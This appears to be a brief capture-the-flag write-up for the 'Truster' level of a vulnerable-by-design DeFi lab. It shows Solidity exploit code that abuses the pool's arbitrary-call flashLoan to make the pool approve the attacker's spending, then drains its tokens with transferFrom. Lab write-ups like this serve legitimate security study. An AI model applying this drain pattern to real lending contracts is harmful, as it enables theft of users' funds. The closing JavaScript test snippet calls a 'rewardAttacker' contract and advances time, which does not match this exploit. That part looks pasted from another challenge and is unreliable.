# Truster

1. `TrusterLenderPool.sol` have `flashLoan` that let us do a call to `target` address with also providing `data` for the call. This can be abused by providing DVT token as `target` address and providing `approve()` with the attacker address and the DVT amount as parameter. Then we can drain the DVT from the contract.

```solidity
    bytes memory data = abi.encodeWithSignature(
        "approve(address,uint256)",
        address(this),
        borrowAmount
    );

    // we put malicious call inside flashLoan target and data, approve this attacker contract spending DVT on behalf of truster contract
    truster.flashLoan(
        borrowAmount,
        address(truster),
        address(damnValuableToken),
        data
    );

    // then we spend the DVT
    damnValuableToken.transferFrom(
        address(truster),
        msg.sender,
        borrowAmount
    );
```

the javascipt test script :

```javascript
await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);

await this.rewardAttacker.attack(TOKENS_IN_LENDER_POOL);
```
